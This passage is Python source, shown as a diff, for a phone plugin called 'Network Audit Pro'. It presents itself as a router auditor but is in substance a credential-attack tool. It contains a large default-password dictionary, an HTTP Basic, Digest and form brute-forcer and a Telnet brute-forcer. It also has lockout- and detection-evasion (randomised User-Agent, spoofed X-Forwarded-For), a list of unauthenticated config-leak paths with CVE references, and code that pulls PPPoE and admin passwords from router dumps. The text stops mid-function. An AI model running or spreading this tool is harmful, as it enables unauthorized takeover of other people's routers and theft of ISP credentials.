@@ -1,0 +1,3056 @@
+__id__ = "net_audit_pro"
+__name__ = "Network Audit Pro"
+__version__ = "1.6.1"
+__author__ = "Pinaplast"
+__description__ = "Аудитор домашних роутеров: доступ к панели (Basic/Digest/форма), Telnet и UPnP-замеры, поиск утечек конфигов, отчёты и журнал событий. Плагин рабочий, но требует тестов на разных роутерах. Если будут баги или ошибки, просьба скидывать их мне в ТГ: @Pinaplast457"
+__icon__ = "rounded:lock_open"
+__library__ = False
+__design_library__ = False
+__dependencies__ = []
+__permissions__ = ["internet", "files"]
+
+import threading
+import socket
+import base64
+import time
+import json
+import re
+import os
+import random
+import urllib.parse
+import hashlib
+import zlib
+
+try:
+    threading.stack_size(128 * 1024)
+except Exception:
+    pass
+
+import ssl
+
+
+def _tls_context():
+    # роутерный TLS почти всегда самоподписной: строгая проверка цепочки
+    # убивает подключение, поэтому проверку отключаем осознанно
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+ADMIN_PORTS = [
+    (80, "HTTP"),
+    (443, "HTTPS"),
+    (8080, "Web-Alt"),
+    (23, "Telnet"),
+    (21, "FTP"),
+]
+
+BRAND_SIGNATURES = {
+    "TP-Link": ["tplink", "tp-link"],
+    "D-Link": ["d-link", "dlink", "hnap"],
+    "Keenetic": ["keenetic", "ndm"],
+    "Zyxel": ["zyxel", "zywall", "rom-0"],
+    "Asus": ["asustek", "asus router", "main_login"],
+    "Netgear": ["netgear", "genie"],
+    "Xiaomi": ["xiaomi", "miwifi", "redmi"],
+    "Huawei": ["huawei", "echo_life", "hg8245"],
+    "ZTE": ["zte", "f660", "f460", "gpon"],
+    "Linksys": ["linksys", "wrt"],
+    "Mikrotik": ["mikrotik", "routeros", "webfig"],
+    "OpenWrt": ["luci", "openwrt"],
+    "Rostelecom": ["rostelecom", "rt-", "rt-"],
+}
+
+BRAND_LOGIN_PATHS = {
+    "TP-Link": ["/", "/login.html"],
+    "D-Link": ["/", "/login.php"],
+    "Asus": ["/Main_Login.asp", "/"],
+    "Xiaomi": ["/cgi-bin/luci/web"],
+    "Huawei": ["/html/ssmp/main/login.asp", "/"],
+    "ZTE": ["/", "/login.html"],
+    "Zyxel": ["/login.cgi", "/"],
+    "Netgear": ["/", "/setup.cgi?next_file=login.htm"],
+    "Keenetic": ["/login", "/"],
+    "OpenWrt": ["/cgi-bin/luci/", "/cgi-bin/luci"],
+    "Mikrotik": ["/webfig/"],
+}
+
+BRAND_CREDS = {
+    "TP-Link": [("admin", "admin"), ("admin", "1234")],
+    "D-Link": [("admin", ""), ("admin", "admin"), ("Admin", "admin"), ("user", "user")],
+    "Keenetic": [("admin", "admin"), ("admin", "1234"), ("superuser", "superuser")],
+    "Zyxel": [("admin", "1234"), ("admin", "admin"), ("supervisor", "supervisor")],
+    "Asus": [("admin", "admin")],
+    "Netgear": [("admin", "password"), ("admin", "admin"), ("admin", "1234")],
+    "Xiaomi": [("admin", "admin"), ("root", "root")],
+    "Huawei": [("root", "admin"), ("admin", "admin"), ("Epuser", "userEp"), ("telecomadmin", "admintelecom")],
+    "ZTE": [("root", "Zhone@internet#Ex"), ("admin", "admin"), ("telecomadmin", "admintelecom")],
+    "Linksys": [("admin", "admin"), ("", "admin")],
+    "Mikrotik": [("admin", ""), ("admin", "admin")],
+    "OpenWrt": [("root", ""), ("root", "root")],
+    "Rostelecom": [("superadmin", "SuperPassword"), ("admin", "admin")],
+}
+
+CREDS_BY_REALM = {
+    "broadband router": [("admin", "admin")],
+    "administrative": [("admin", "admin")],
+    "wlan-ap": [("admin", "admin")],
+    "basicauth": [("admin", "admin")],
+    "sercomm": [("admin", "sercomm")],
+    "tenda": [("admin", "admin"), ("admin", "tenda")],
+    "mercury": [("admin", "admin")],
+    "mercusys": [("admin", "admin")],
+    "totolink": [("admin", "admin")],
+    "netgear": [("admin", "password")],
+    "keengee": [("admin", "admin")],
+    "netis": [("guest", "guest"), ("admin", "admin")],
+    "mts": [("admin", "adminmts")],
+    "huawei": [("root", "admin"), ("admin", "adminHW")],
+    "zte": [("root", "Zhone@internet#Ex")],
+    "cisco": [("cisco", "cisco")],
+    "titan": [("admin", "admin")],
+    "digifant": [("admin", "admin")],
+    "web-server": [("admin", "admin")],
+    "router": [("admin", "admin"), ("root", "root")],
+    "admin": [("admin", "admin"), ("admin", "1234"), ("admin", "")],
+}
+
+GENERIC_CREDS = [
+    ("admin", "admin"), ("admin", "12345"), ("admin", ""),
+    ("admin", "password"), ("admin", "1234"), ("admin", "12345678"),
+    ("root", "root"), ("root", "admin"), ("root", "12345"),
+    ("root", "Zhone@internet#Ex"), ("user", "user"),
+    ("support", "support"), ("telecomadmin", "admintelecom"),
+    ("administrator", "admin"), ("super", "super"),
+    ("guest", "guest"),
+]
+
+USER_DICT = [
+    "admin", "root", "user", "support", "guest",
+    "administrator", "telecomadmin", "super", "operator", "Admin",
+]
+
+PASS_DICT = [
+    "", "admin", "1234", "12345", "123456", "12345678",
+    "password", "qwerty", "qwe123", "1111", "0000",
+    "root", "toor", "user", "guest", "default",
+    "admintelecom", "admin12", "radmin", "pass", "router",
+    "zhone", "gpon", "abcd1234", "letmein", "123321",
+]
+
+DEFAULT_DICT_TEXT = """admin admin
+admin
+admin 1234
+admin 12345
+admin password
+admin 123456
+admin 12345678
+admin 123456789
+admin 1234567890
+admin qwerty
+admin qwerty123
+admin qwe123
+admin admin123
+admin admin1234
+admin admin12345
+admin Admin123
+admin pass
+admin pass123
+admin password1
+admin passw0rd
+admin p@ssw0rd
+admin root
+admin 1111
+admin 0000
+admin 123123
+admin 112233
+admin 2024
+admin 2025
+admin test
+admin test123
+admin router
+admin router123
+admin changeme
+admin default
+admin cisco
+cisco cisco
+admin tplink
+admin tp-link
+tplink tplink
+admin dlink
+dlink dlink
+admin zyxel
+zyxel zyxel
+admin asus
+asus asus
+admin netgear
+admin miwifi
+miwifi miwifi
+admin linksys
+admin motorola
+admin tenda
+tenda tenda
+admin mercury
+admin mercusys
+admin totolink
+admin upvel
+admin sercomm
+admin sercomm1
+admin webadmin
+webadmin webadmin
+admin system
+admin manage
+admin manager
+admin secret
+admin letmein
+admin 1234567
+admin 147258369
+admin 987654321
+admin abcd1234
+admin abcd
+admin iloveyou
+admin sunshine
+admin dragon
+admin monkey
+admin master
+admin jordan
+admin superman
+admin trustno1
+admin baseball
+admin football
+admin shadow
+admin michael
+admin jennifer
+admin hunter
+admin hunter2
+admin firebird
+admin cricket
+admin snowflake
+admin snowball
+root root
+root
+root admin
+root toor
+root 1234
+root 12345
+root password
+root zxasqw12
+root Zte521
+root public
+root private
+root system
+root admin123
+root qwerty
+root Zhone@internet#Ex
+root GEPON
+root gearnd
+support support
+support
+support 1234
+guest guest
+guest
+guest 1234
+user user
+user
+user 1234
+user password
+operator operator
+operator
+operator 1234
+operator CoxHolmes434VoIP
+super super
+super sprom
+superuser superuser
+superuser
+supervisor supervisor
+supervisor supervisor1
+administrator admin
+administrator
+administrator 1234
+administrator password
+telecomadmin admintelecom
+telecomadmin telecomadmin
+telecomadmin nE7jA%5m
+Epuser userEp
+epicrouter epicrouter
+admin admin_ROSTELECOM
+rostelecom rostelecom
+superadmin SuperPassword
+superadmin admin
+admin mts
+mts mts
+admin MtE5klO9j5!
+admin beeline
+beeline beeline
+admin mgts
+mgts mgts
+admin vt_23243199
+admin fibitcom
+fiberhomegw fiberhomegw
+gpon gpon
+gpon zgjhfje
+admin homeportal
+user pppoe
+adsl adsl
+adsl highground
+admin admintelecom
+admin 11111
+admin 22222
+admin 12345a
+admin Admin12#
+admin aDm1n
+admin adm1n
+admin admintele
+admin domain
+admin mypassword
+admin myserver
+admin welcome
+admin welcome1
+admin internet
+admin internet1
+admin kentot
+admin zver
+admin knoppix
+admin hh22288888
+admin moodle
+admin imissyou
+admin sexylady
+admin eyebrows
+admin falcon181
+admin meinsm
+admin media
+admin netconfirm
+admin PAA=FORGOT
+admin emoboy
+admin dreambox
+admin trance
+admin gaming
+admin sigma
+admin lycan
+admin linksys
+linksys linksys
+admin comcast
+admin 123qweasd
+admin ADSL
+admin bridge
+admin vlan
+admin wifi
+admin wlan
+admin wifipass
+admin wpa2
+admin nanidog69
+admin Paralife19
+admin desire4una
+admin guldan
+admin 123abc
+admin abcd123
+admin qazwsx
+admin zaq123
+admin asdfgh
+admin zxcvbnm
+admin 1q2w3e
+admin 1q2w3e4r
+admin 1qaz2wsx
+admin qazxsw
+admin 555555
+admin 666666
+admin 888888
+admin 159357
+admin 13579
+admin 4567
+admin 5678
+admin 6789
+admin 4321
+admin 2580
+admin 0852
+admin 95175384
+admin 520520
+admin 5201314
+admin 114477
+admin 357159
+admin adm*
+admin AdMiN12654
+user pppoa
+admin xc2v1vl20b14
+admin hMcDu32L0kxs
+admin lp1ppT72cSm2
+admin 98K7vugAtHtn
+admin 06480
+admin Fh@k3nG3pOn
+admin 111111
+admin 222222
+admin 333333
+admin 444444
+admin 777777
+admin 999999
+admin 101010
+admin 88888888
+admin 12341234
+admin 11223344
+admin 10203040
+admin 12345543
+admin 567890
+admin 678910
+admin 987654
+admin 741852
+admin 741852963
+admin 963852741
+admin 789456123
+admin 159753
+admin 124578
+admin 1234qwer
+admin 1qazxsw2
+admin 2wsx3edc
+admin 3edc4rfv
+admin qwaszx
+admin q1w2e3r4t5
+admin qwerty12
+admin qwerty1234
+admin qwerty123456
+admin qwertyui
+admin qwertyuiop
+admin asdfghjkl
+admin asdf1234
+admin zxcv123
+admin zxcvbnm1
+admin 1a2b3c
+admin a123456
+admin a123456789
+admin aa123456
+admin abc123
+admin abc12345
+admin abcd1234
+admin hello123
+admin home123
+admin house123
+admin internet123
+admin internetpass
+admin netpass
+admin wifi123
+admin wifi1234
+admin wlan123
+admin wpa123
+admin pass1234
+admin pass12345
+admin password123
+admin password12
+admin password1234
+admin passw0rd1
+admin Passw0rd
+admin Password1
+admin Password123
+admin P@ssword1
+admin p@ssword
+admin pa55word
+admin admin@123
+admin Admin@123
+admin Admin@1234
+admin Admin@2024
+admin Admin@2025
+admin admin@2024
+admin admin@2025
+admin adm@in
+admin changeit
+admin changed
+admin secret1
+admin letmein1
+admin welcome123
+admin welcome2
+admin superman1
+admin megaadmin
+admin system1
+admin manage123
+admin routerpass
+admin r00ter
+admin Adm1n!
+admin adm1n1strator
+admin administrator1
+adminadmin
+admin password!
+root 123456
+root 12345678
+root root123
+root linux
+root alpine
+root debian
+root raspberry
+root toor123
+root qwerty12
+root qwerty123
+root letmein
+root 1337
+root 666666
+root 123qwe
+root p@ssw0rd
+root Passw0rd
+support 123456
+support support1
+support letmein
+user 123456
+user user123
+guest 123456
+guest password
+technician technician
+technician
+tech tech
+tech 1234
+sysadmin sysadmin
+sysadmin
+sysadmin 1234
+manage manage
+manage
+manage 1234
+engineer engineer
+engineer
+engineer 1234
+broadband broadband
+broadband
+dialup dialup
+dialup
+megafon megafon
+megafon
+admin megafon
+mikrotik mikrotik
+admin Admin12
+admin admins
+admin admin1
+Admin admin
+ADMIN admin
+admin rfhfif
+admin пароль
+admin parol
+admin parol123
+admin asdf123
+admin sanya
+admin NAPOLEON
+"""
+
+AUTH_MODE_LABELS = {"basic": "Basic Auth", "digest": "Digest Auth"}
+
+# компактный телнет-словарь: заводские пары + самые частые из большого словаря
+TELNET_CREDS = [
+    ("admin", "admin"), ("admin", "admin123"), ("admin", ""), ("admin", "password"),
+    ("admin", "1234"), ("admin", "12345"), ("root", "root"), ("root", "admin"),
+    ("root", ""), ("root", "Zhone@internet#Ex"), ("root", "Zte521"), ("support", "support"),
+    ("user", "user"), ("guest", "guest"), ("telecomadmin", "admintelecom"),
+    ("superadmin", "SuperPassword"), ("Epuser", "userEp"), ("cisco", "cisco"),
+]
+
+TELNET_LOGIN_MARKERS = ("login:", "username:", "user name:", "user:", "name:")
+TELNET_PASS_MARKERS = ("password:", "passwd:", "pass:")
+TELNET_FAIL_MARKERS = ("incorrect", "invalid", "wrong", "denied", "failed", "bad password", "error")
+
+
+def strip_telnet_iacs(data):
+    # выкидываем управляющие последовательности telnet (IAC, WILL/WONT/DO/DONT/SB..SE)
+    out = bytearray()
+    i = 0
+    n = len(data)
+    while i < n:
+        b = data[i]
+        if b != 255:
+            out.append(b)
+            i += 1
+            continue
+        if i + 1 >= n:
+            break
+        cmd = data[i + 1]
+        if cmd in (251, 252, 253, 254):
+            i += 3
+        elif cmd in (250,):
+            se = data.find(b"\xff\xf0", i)
+            i = se + 2 if se >= 0 else n
+        else:
+            i += 2
+    return bytes(out)
+
+
+def classify_telnet_reply(text):
+    # вердикт по тому, что роутер напечатал после ввода пароля
+    low = str(text or "").lower()
+    if any(m in low for m in TELNET_FAIL_MARKERS):
+        return "fail"
+    if any(m in low for m in TELNET_LOGIN_MARKERS):
+        return "retry"
+    if any(ch in low for ch in ("#", "$", "]", ">")):
+        return "success"
+    return "unknown"
+
+
+def extract_pppoe_credentials(xml_text):
+    user = re.search(r'(?:pppoe[_-]?user(?:name)?|wan[_-]?user(?:name)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
+    passw = re.search(r'(?:pppoe[_-]?pass(?:word)?|wan[_-]?pass(?:word)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
+    # запасной вариант: типичные теги пароля
+    if not passw:
+        passw = re.search(r'(?:admin[_-]?pass(?:word)?|newpass(?:word)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
+    user_val = user.group(1).strip() if user else ""
+    pass_val = passw.group(1).strip() if passw else ""
+    return user_val, pass_val
+
+
+def decode_chunked_body(raw):
+    # HTTP/1.1 chunked: снимаем маркеры размеров (1f2e\r\n...),
+    # оставляя чистое тело; на сбое возвращаем вход как есть
+    out = bytearray()
+    i = 0
+    while True:
+        j = raw.find(b"\r\n", i)
+        if j < 0:
+            # маркеров нет: если и чанков не распознали — это просто тело, отдаём как есть
+            return bytes(out) if out else bytes(raw)
+        size_hdr = raw[i:j].split(b";")[0].strip()
+        try:
+            size = int(size_hdr, 16)
+        except Exception:
+            return bytes(raw)
+        if size == 0:
+            break
+        out += raw[j + 2: j + 2 + size]
+        i = j + 2 + size + 2  # перепрыгиваем CRLF после чанка
+    return bytes(out)
+
+
+def decode_rom0_secrets(body_bytes):
+    # rom-0 несёт сжатые zlib-секции внутри бинарного дампа
+    secrets = []
+    if not body_bytes:
+        return secrets
+    for start in range(0, min(len(body_bytes), 8192) - 2):
+        if body_bytes[start] == 0x78 and body_bytes[start + 1] in (0x01, 0x9C, 0xDA, 0x5E):
+            try:
+                chunk = zlib.decompressobj().decompress(body_bytes[start:start + 4096])
+                if len(chunk) >= 16:
+                    text = chunk.decode("latin-1", errors="replace")
+                    user, passwd = extract_pppoe_credentials(text)
+                    if user and passwd:
+                        secrets.append((user, passwd))
+                        break
+            except Exception:
+                continue
+    return secrets
+
+
+KNOWN_ROUTES = [
+    ("/rom-0", "Дамп конфигурации без пароля (классика Zyxel), содержит PPPoE и Wi-Fi пароли"),
+    ("/HNAP1/", "SOAP-интерфейс HNAP у D-Link: известны обходы авторизации и RCE (CVE-2013-7381, CVE-2018-6530)"),
+    ("/goform/goform_get_cmd_process?isTest=false&cmd=WAN_STAT", "Статистика WAN через ZTE goform иногда отдаётся без сессии"),
+    ("/getpage.gch?pid=1002&nextpage=Gpon_epoinfo_t.gch", "ZTE F460/F660 GPON: страница с PPPoE-логином/паролем провайдера без авторизации"),
+    ("/GponForm/diag_Form?images/", "GPON диагностическая форма, известна обходом входа (CVE-2018-10561) и RCE"),
+    ("/cgi-bin/status_cgi", "DD-WRT страница статуса: таблицы DHCP и WAN часто видны без логина"),
+    ("/backup_settings_2.xml", "Бэкап настроек, внутри сохранённые пароли"),
+    ("/boaform/admin/formLogin", "BOA webserver (Realtek/ZTE-платы): формы админки отвечают даже пустой сессии"),
+    ("/SystemInfo.html", "Инфо о прошивке без входа (различные китайские прошивки)"),
+]
+
+LOGIN_PASSWORD_INPUT_MARKERS = ['type="password"', "type='password'", "type=password"]
+LOGGED_IN_MARKERS = ("logout", "выйти", "выход", "administration", "reboot", "firmware upgrade", "wps")
+
+_DEFAULT_PAIRS_CACHE = None
+
+
+def default_dict_pairs():
+    # встроенный словарь статичен: парсим один раз, иначе рендер экрана
+    # перекраивает 380 строк каждые 0.5 с во время атаки
+    global _DEFAULT_PAIRS_CACHE
+    if _DEFAULT_PAIRS_CACHE is None:
+        _DEFAULT_PAIRS_CACHE = _parse_pairs_static(DEFAULT_DICT_TEXT)
+    return list(_DEFAULT_PAIRS_CACHE)
+
+
+def _parse_pairs_static(text):
+    pairs = []
+    for raw in str(text or "").splitlines():
+        line = raw.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split(None, 1)
+        if not parts:
+            continue
+        user = parts[0]
+        password = parts[1].strip() if len(parts) > 1 else ""
+        if not password and ":" in user:
+            user, password = user.split(":", 1)
+        pairs.append((user.strip(), password))
+    return pairs
+
+
+LOCKOUT_THRESHOLD = 5
+NETFAIL_THRESHOLD = 4
+NETFAIL_PAUSE_S = 30
+
+
+def extract_retry_after(full_text):
+    # пауза, которую роутер требует в заголовке Retry-After; потолок 120 сек
+    m = re.search(r"(?im)^retry-after:\s*([0-9]+)", full_text or "")
+    if not m:
+        return 0
+    try:
+        return min(int(m.group(1)), 120)
+    except Exception:
+        return 0
+
+ANDROID_MODELS = ["SM-S928B", "SM-G998B", "Pixel 8 Pro", "Pixel 9", "Redmi Note 13", "21061119DG"]
+CHROME_MIN, CHROME_MAX = 118, 142
+
+
+def generate_random_user_agent():
+    platform_choice = random.choice([
+        "Windows NT 10.0; Win64; x64",
+        "Macintosh; Intel Mac OS X 10_15_7",
+        "X11; Linux x86_64",
+        "Linux; Android {}; {}".format(random.randint(11, 15), random.choice(ANDROID_MODELS)),
+        "iPhone; CPU iPhone OS {}_{} like Mac OS X".format(random.randint(15, 18), random.randint(0, 5)),
+    ])
+    chrome_ver = "{}.0.{}.{}".format(
+        random.randint(CHROME_MIN, CHROME_MAX),
+        random.randint(1000, 6999),
+        random.randint(10, 199),
+    )
+    return (
+        "Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/{} Safari/537.36".format(platform_choice, chrome_ver)
+    )
+
+
+def generate_basic_token(username, password):
+    raw = "{}:{}".format(username, password).encode("utf-8")
+    return base64.b64encode(raw).decode("ascii")
+
+
+def parse_digest_challenge(header_value):
+    # принимает и полную строку WWW-Authenticate, и только значение после неё
+    body = str(header_value or "").split(":", 1)[-1]
+    params = {}
+    if "digest" not in body.lower():
+        return params
+    for match in re.finditer(r'(\w+)\s*=\s*(?:"([^"]*)"|([^\s,]+))', body):
+        params[match.group(1).lower()] = match.group(2) if match.group(2) is not None else match.group(3)
+    return params
+
+
+def md5_hex(text):
+    return hashlib.md5(str(text).encode("utf-8")).hexdigest()
+
+
+def build_digest_header(params, username, password, method, path, nc="00000001", cnonce=""):
+    realm = params.get("realm", "")
+    nonce = params.get("nonce", "")
+    qop = params.get("qop", "")
+    uri = path or "/"
+    ha1 = md5_hex("{}:{}:{}".format(username, realm, password))
+    ha2 = md5_hex("{}:{}".format(method, uri))
+    opaque = params.get("opaque", "")
+    if qop:
+        response = hashlib.md5("{}:{}:{}:{}:auth:{}".format(ha1, nonce, nc, cnonce or "0a4b1f", ha2).encode()).hexdigest()
+        header = (
+            'Digest username="{}", realm="{}", nonce="{}", uri="{}", '
+            'response="{}", qop=auth, nc={}, cnonce="{}", algorithm=MD5'.format(
+                username, realm, nonce, uri, response, nc, cnonce or "0a4b1f"
+            )
+        )
+    else:
+        response = hashlib.md5("{}:{}:{}".format(ha1, nonce, ha2).encode()).hexdigest()
+        header = (
+            'Digest username="{}", realm="{}", nonce="{}", uri="{}", response="{}", algorithm=MD5'.format(
+                username, realm, nonce, uri, response
+            )
+        )
+    if opaque:
+        header += ', opaque="{}"'.format(opaque)
+    return header
+
+
+def build_form_body(username, password, fields=None):
+    if fields and fields[1]:
+        # page-поля точнее любого справочника: шлём ровно то, что просит роутер
+        user_f, pass_f, hidden = fields
+        pairs = list(hidden)
+        if user_f:
+            pairs.append((user_f, username))
+        if pass_f:
+            pairs.append((pass_f, password))
+        if pairs:
+            return urllib.parse.urlencode(pairs)
+    pairs = [
+        ("username", username),
+        ("password", password),
+        ("userName", username),
+        ("passWord", password),
+        ("luci_username", username),
+        ("luci_password", password),
+        ("login_username", username),
+        ("login_password", password),
+        ("admin_password", password),
+    ]
+    # urlencode обязателен: символы =,&,+ и пробел в пароле иначе ломают разбор тела
+    return urllib.parse.urlencode(pairs)
+
+
+# имя полей user/pass берём из самой страницы роутера: у каждого бренда свои
+# имена (luci_*, userName, admPasswd...), фиксированный список всегда отстаёт.
+# Скрытые поля (nonce/token) с их value идут в тело как есть
+def extract_form_fields(html):
+    for block in re.findall(r"<form\b.*?</form>", html or "", re.IGNORECASE | re.DOTALL):
+        if not any(m in block.lower() for m in LOGIN_PASSWORD_INPUT_MARKERS):
+            continue
+        user_f, pass_f, hidden = "", "", []
+        for inp in re.findall(r"<input\b[^>]*>", block, re.IGNORECASE):
+            nm = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', inp, re.IGNORECASE)
+            if not nm:
+                continue
+            name_s = nm.group(1)
+            typ = re.search(r'type\s*=\s*["\']?([^"\'\s>]+)', inp, re.IGNORECASE)
+            typ_s = (typ.group(1).lower() if typ else "text")
+            val = re.search(r'value\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
+            if typ_s == "hidden":
+                hidden.append((name_s, val.group(1) if val else ""))
+            elif typ_s == "password" and not pass_f:
+                pass_f = name_s
+            elif typ_s in ("text", "email", "tel", "number", "") and not user_f:
+                user_f = name_s
+        if pass_f:
+            return user_f, pass_f, hidden
+    return "", "", []
+
+
+class NetAuditPro(BasePlugin):
+    def on_plugin_load(self):
+        self.add_module(
+            title="Network Audit Pro",
+            description="Аудит сетевых устройств: доступ к панели управления (Basic/Digest/форма), Telnet и UPnP-замеры, утечки конфигов, отчёты и журнал событий. Плагин рабочий, но требует тестов на разных роутерах. Если будут баги или ошибки, просьба скидывать их мне в ТГ: @Pinaplast457",
+            icon="lock_open",
+            screen="main",
+            section="PLUGINS"
+        )
+
+        self.running = False
+        self.stop_flag = False
+        self.found_flag = False
+        self.brute_done = False
+        self.found_creds = None
+        self.expected_total = 0
+        self.threads = []
+
+        self.logs = []
+        self.logs_lock = threading.Lock()
+
+        self.stats_lock = threading.Lock()
+        self.tried_count = 0
+        self.fail_count = 0
+        self.lockout_count = 0
+        self.evade_pauses = 0
+        self.pps = 0
+        self._cursor = 0
+        self._cursor_lock = threading.Lock()
+        self._consec_lockouts = 0
+        self._consec_netfail = 0
+        self._cooldown_until = 0.0
+        self._run_gen = 0
+
+        self.vulns_found = []
+        self.telnet_creds = None
+        self._probing = False
+        self._last_seen_ip = ""
+        self._dict_scan_cache = ()
+        self.brand_hint = ""
+        self.panel_title = ""
+        self.auth_realm = ""
+        self.auth_scheme = "basic"
+        self.digest_params = None
+        self._form_fields = None
+
+        self.ping_status_text = "Нажмите «Пинг», чтобы опросить роутер."
+        self.scan_results_txt = "Сканер портов покажет результат здесь."
+        self.generated_report_text = ""
+        self._brute_started_ts = 0.0
+        self.last_run_summary = None
+
+        self.gateway = self.get_setting("gateway", "")
+        self.port = self._safe_int(self.get_setting("port", 80), 80, 1, 65535)
+        self.mode = self.get_setting("mode", "auto")
+        self.num_threads = self._safe_int(self.get_setting("num_threads", 12), 12, 1, 64)
+        self.timeout_seconds = self._safe_int(self.get_setting("timeout_seconds", 4), 4, 1, 30)
+        self.stop_on_success = self.get_setting("stop_on_success", True) is True
+        self.custom_users_text = str(self.get_setting("custom_users", ""))
+        self.custom_passes_text = str(self.get_setting("custom_passes", ""))
+        self.custom_dict_text = str(self.get_setting("custom_dict_text", ""))
+        self._imported_pairs_count = len(_parse_pairs_static(self.custom_dict_text))
+
+        self.evasion_ua = self.get_setting("evasion_ua", True) is True
+        self.evasion_xff = self.get_setting("evasion_xff", False) is True
+        self.attempt_delay_ms = self._safe_int(self.get_setting("attempt_delay_ms", 20), 20, 0, 5000)
+        self.lockout_pause_s = self._safe_int(self.get_setting("lockout_pause_s", 10), 10, 0, 600)
+        self.manual_dict_path = str(self.get_setting("manual_dict_path", ""))
+
+        self.status_line = "Ожидание запуска. Проверьте шлюз и порт."
+        self._cached_ip = ""
+        self._cached_ip_time = 0.0
+        self._cached_vpn = None
+        self._cached_vpn_time = 0.0
+        self._device_ssid = ""
+        self._init_auto_gateway()
+
+    def _log(self, text, level="INFO"):
+        icons = {
+            "INFO": "ℹ️",
+            "WARN": "⚠️",
+            "ERR": "❌",
+            "OK": "✅",
+            "BRUTE": "🔨",
+            "SCAN": "🔍",
+            "HIT": "🎉",
+            "VULN": "🔓",
+            "DICT": "🔤",
+            "EVADE": "🥷"
+        }
+        prefix = icons.get(level, "🔹")
+        timestamp = time.strftime("%H:%M:%S")
+        entry = "[{}] {} {}".format(timestamp, prefix, text)
+        with self.logs_lock:
+            self.logs.append(entry)
+            if len(self.logs) > 80:
+                self.logs.pop(0)
+
+    def _clear_logs(self):
+        with self.logs_lock:
+            self.logs.clear()
+        self.refresh()
+
+    def _safe_close_socket(self, sock):
+        if not sock:
+            return
+        try:
+            sock.close()
+        except Exception:
+            pass
+
+    def _parse_csv(self, text):
+        items = []
+        for part in str(text or "").split(","):
+            clean = part.strip()
+            if clean:
+                items.append(clean)
+        return items
+
+    def _parse_dict_pairs(self, text):
+        return _parse_pairs_static(text)
+
+    # ------------------- Выбор файла словаря -------------------
+
+    DICT_DIRS = ["/sdcard", "/sdcard/Download", "/sdcard/Documents"]
+    DICT_WALK_DEPTH = 2
+
+    def _scan_dict_files(self, max_results=24):
+        cached = self._dict_scan_cache
+        # ttl-кэш: os.walk по всей памяти не должен случаться на каждом рендере
+        if cached and cached[0] >= max_results and (time.time() - cached[1]) < 10.0:
+            return list(cached[2][:max_results])
+        found = {}
+        for base_dir in self.DICT_DIRS:
+            try:
+                for dirpath, dirnames, filenames in os.walk(base_dir):
+                    depth = dirpath[len(base_dir):].count(os.sep)
+                    if depth >= self.DICT_WALK_DEPTH:
+                        dirnames[:] = []
+                    for filename in filenames:
+                        if not filename.lower().endswith(".txt"):
+                            continue
+                        if filename.startswith("."):
+                            continue
+                        full_path = os.path.join(dirpath, filename)
+                        try:
+                            size_bytes = os.path.getsize(full_path)
+                            if size_bytes <= 0 or size_bytes > 2097152:
+                                continue
+                            found[full_path] = size_bytes
+                        except Exception:
+                            pass
+                    if len(found) >= max_results:
+                        break
+            except Exception:
+                continue
+            if len(found) >= max_results:
+                break
+        ordered = sorted(found.items(), key=lambda kv: kv[0])
+        self._dict_scan_cache = (max_results, time.time(), ordered)
+        return ordered[:max_results]
+
+    def _read_text_file(self, path, byte_limit=1048576):
+        size = os.path.getsize(path)
+        if size > byte_limit:
+            self.toast("⚠️ Файл больше 1 МБ, читаю первые 1 МБ")
+        with open(path, "r", encoding="utf-8", errors="replace") as f:
+            return f.read(byte_limit)
+
+    def load_dict_from_path(self, path=None):
+        picked = str(path or self.manual_dict_path or "").strip()
+        self._dict_scan_cache = ()
+        if not picked:
+            names = self._scan_dict_files(1)
+            if names:
+                picked = names[0][0]
+        if not picked:
+            self.toast("❌ Укажите путь к файлу или выберите из списка")
+            return False
+        looks_uri = picked.startswith("content:") or picked.startswith("file:")
+        if not looks_uri and not os.path.exists(picked) and not picked.lower().endswith(".txt"):
+            # пробуем дописать расширение, но только если голый путь не существует
+            candidate = picked + ".txt"
+            if os.path.exists(candidate):
+                picked = candidate
+        if not looks_uri and not os.path.exists(picked):
+            self._log("Файл словаря не найден: {}".format(picked), "ERR")
+            self.toast("❌ Файл не найден: {}".format(os.path.basename(picked) if picked else "-"))
+            self.refresh()
+            return False
+        try:
+            content = self._read_text_file(picked)
+        except Exception as exc:
+            self._log("Не удалось прочитать {}: {}".format(picked, exc), "ERR")
+            self.toast("❌ Файл не читается")
+            self.refresh()
+            return False
+        pairs = self._parse_dict_pairs(content)
+        self.custom_dict_text = content
+        self._imported_pairs_count = len(pairs)
+        self.set_setting("custom_dict_text", content)
+        self.manual_dict_path = picked
+        self.set_setting("manual_dict_path", picked)
+        shown_size = str(os.path.getsize(picked)).replace(",", " ")
+        self._log("Словарь из {}: {} пар ({} байт)".format(picked, len(pairs), shown_size), "DICT")
+        self.toast("✅ Загружено {} пар из {}".format(len(pairs), os.path.basename(picked)))
+        self.refresh()
+        return True
+
+    def clear_custom_dict(self):
+        self.custom_dict_text = ""
+        self._imported_pairs_count = 0
+        self.set_setting("custom_dict_text", "")
+        self._log("Свой словарь очищен", "DICT")
+        self.refresh()
+
+    # ------------------- Кандидаты -------------------
+
+    def _build_candidates(self):
+        seen = set()
+        result = []
+
+        def push(u, p):
+            key = (u, p)
+            if key not in seen:
+                seen.add(key)
+                result.append(key)
+
+        for u, p in BRAND_CREDS.get(self.brand_hint or "", []):
+            push(u, p)
+
+        if self.mode == "auto":
+            push("", "")
+            push("admin", "")
+            push("", "admin")
+
+        for u, p in default_dict_pairs()[:500]:
+            push(u, p)
+
+        imported = self._parse_dict_pairs(self.custom_dict_text)
+        if imported:
+            limited = imported[:10000]
+            for u, p in limited:
+                push(u, p)
+            if len(imported) > 10000:
+                self._log("Свой словарь усечён до 10000 пар", "WARN")
+
+        if self.mode != "form":
+            for u, p in GENERIC_CREDS:
+                push(u, p)
+
+        users = self._parse_csv(self.custom_users_text)
